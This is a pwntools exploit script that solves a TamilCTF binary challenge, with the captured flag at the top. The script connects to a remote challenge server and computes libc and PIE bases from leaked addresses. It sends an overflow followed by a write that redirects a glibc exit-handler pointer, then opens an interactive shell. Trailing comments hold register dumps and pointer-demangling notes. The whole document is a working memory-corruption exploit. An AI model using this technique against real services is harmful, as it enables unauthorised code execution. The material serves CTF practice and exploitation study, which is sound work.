#TamilCTF{W41t_1S_7h1S_4_ST4cK_Ch4ll3ng3_0r_A_H34P_Ch4ll3ng3_33ee7e1eb504b6619c1b445ca1442c21}
from pwn import *

elf = ELF("./chall3")
ld = ELF("./ld-2.31.so")
libc = ELF("./libc6_2.31-0ubuntu9.2_amd64.so")
#libc = elf.libc

#target = process([ld.path, elf.path], env={"LD_PRELOAD": libc.path})
target = remote("3.97.113.25", 9003)

target.recvuntil("STUFF ")
libc_base = int(target.recvuntil(" ", drop=True), 0x10) - libc.sym['system']
log.info("LIBC Base: " + hex(libc_base))
pie_base = int(target.recv(14), 0x10) - 0x0011a2
log.info("PIE Base: " + hex(pie_base))

#where = libc_base + libc.sym['__free_hook']
#where = libc_base + 0x7fe442e24718 - 0x00007fe442c39000
where = libc_base + 0x00007fc1105bd608 - 0x00007fc1103d0000
log.info("Where: " + hex(where))

what = pie_base + elf.sym['no_gadget_here_so_let_me_help_you'] + 1

#gdb.attach(target, 'b *' + hex(what) + "\nc")

target.send("A"*40 + p64(where))

target.sendline(str(what))
#target.sendline(str(0x4141414141414141))

target.interactive()

'''
$rbx   : 0x00007fc1105bd608    0x00007fc110465ee0    <_IO_cleanup+0> endbr64
0x00007fc1103d0000


exit
__run_exit_handlers
__call_tls_dtors

base = 0x00007fe69db49000
rdx = [0x7fe69dd36980 + 0x18]
rdx = 0x21999686288336f9							0x2011dc124fd25477
ror rdx, 0x11
rdx = 0x9b7c90cccb431441							0x2a3b9008ee0927e9
xor    rdx, QWORD PTR fs:0x30
QWORD PTR fs:0x30 = 0x9b7cef2a5694a911				0x2a3befc9fe690ab9
rdx = 0x00007fe69dd7bd50							0x00007fc110602d50
'''